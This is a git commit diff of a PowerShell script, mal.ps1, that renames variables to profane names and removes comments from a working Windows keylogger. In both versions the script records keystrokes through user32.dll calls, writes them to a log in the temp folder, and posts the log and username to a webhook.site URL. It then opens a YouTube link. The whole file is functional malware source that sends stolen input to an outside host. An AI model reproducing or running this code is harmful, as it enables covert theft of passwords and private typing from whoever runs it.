ab38aef31a0b0640e71b6ae0f3e7b2e894532d63
Elijah Cuff <62396650+ElijahCuff@users.noreply.github.com>
2022-08-01 00:38:30 +1000

    Update mal.ps1
    ummm,m

--- mal.ps1
+++ mal.ps1
@@ -1,26 +1,13 @@
-
-# webhook, CHANGE ME
-$webhook = "https://webhook.site/646f82bf-b989-4b96-be90-ba140a8ead03"
-
-# write pid
-$PID > "$env:temp/DdBPKCytRe"
-
-# keylogger
-function KeyLogger($logFile="$env:temp/$env:UserName.log") {
-
-  # webhook process
-  $logs = Get-Content "$logFile" | Out-String
+$GetFucked = "https://webhook.site/646f82bf-b989-4b96-be90-ba140a8ead03"
+  $BitchNipples = New-Item -Path $Bitch -ItemType File -Force
+function Bitch($Bitch="$env:temp/$env:UserName.log") {
+  $turds = Get-Content "$Bitch" | Out-String
   $Body = @{
     'username' = $env:UserName
-    'content' = $logs
+    'content' = $turds
   }
-  Invoke-RestMethod -Uri $webhook -Method 'post' -Body $Body
-
-  # generate log file
-  $generateLog = New-Item -Path $logFile -ItemType File -Force
-
-  # API signatures
-  $APIsignatures = @'
+  Invoke-RestMethod -Uri $GetFucked -Method 'post' -Body $Body
+  $ciggies = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
 public static extern short GetAsyncKeyState(int virtualKeyCode);
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
@@ -30,50 +17,31 @@ public static extern int MapVirtualKey(uint uCode, int uMapType);
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
 public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
 '@
-
- # set up API
- $API = Add-Type -MemberDefinition $APIsignatures -Name 'Win32' -Namespace API -PassThru
-
-  # attempt to log keystrokes
+ $Fucker = Add-Type -MemberDefinition $ciggies -Name 'Win32' -Namespace API -PassThru
   try {
     while ($true) {
       Start-Sleep -Milliseconds 40
 
       for ($ascii = 9; $ascii -le 254; $ascii++) {
-
-        # use API to get key state
-        $keystate = $API::GetAsyncKeyState($ascii)
-
-        # use API to detect keystroke
-        if ($keystate -eq -32767) {
+        $shit = $Fucker::GetAsyncKeyState($ascii)
+        if ($shit -eq -32767) {
           $null = [console]::CapsLock
-
-          # map virtual key
-          $mapKey = $API::MapVirtualKey($ascii, 3)
-
-          # create a stringbuilder
-          $keyboardState = New-Object Byte[] 256
-          $hideKeyboardState = $API::GetKeyboardState($keyboardState)
-          $loggedchar = New-Object -TypeName System.Text.StringBuilder
-
-          # translate virtual key
-          if ($API::ToUnicode($ascii, $mapKey, $keyboardState, $loggedchar, $loggedchar.Capacity, 0)) {
-            # add logged key to file
-            [System.IO.File]::AppendAllText($logFile, $loggedchar, [System.Text.Encoding]::Unicode)
+          $when = $Fucker::MapVirtualKey($ascii, 3)
+          $where = New-Object Byte[] 256
+          $who = $Fucker::GetKeyboardState($where)
+          $why = New-Object -TypeName System.Text.StringBuilder
+          if ($Fucker::ToUnicode($ascii, $when, $where, $why, $why.Capacity, 0)) {
+            [System.IO.File]::AppendAllText($Bitch, $why, [System.Text.Encoding]::Unicode)
           }
         }
       }
     }
   }
-
-  # send logs if code fails
   finally {
-    # send logs via webhook
-    Invoke-RestMethod -Uri $webhook -Method 'post' -Body $Body
+    Invoke-RestMethod -Uri $GetFucked -Method 'post' -Body $Body
   }
 }
 
-# run keylogger
-KeyLogger
+Bitch
 start https://www.youtube.com/watch?v=dQw4w9WgXcQ
 exit
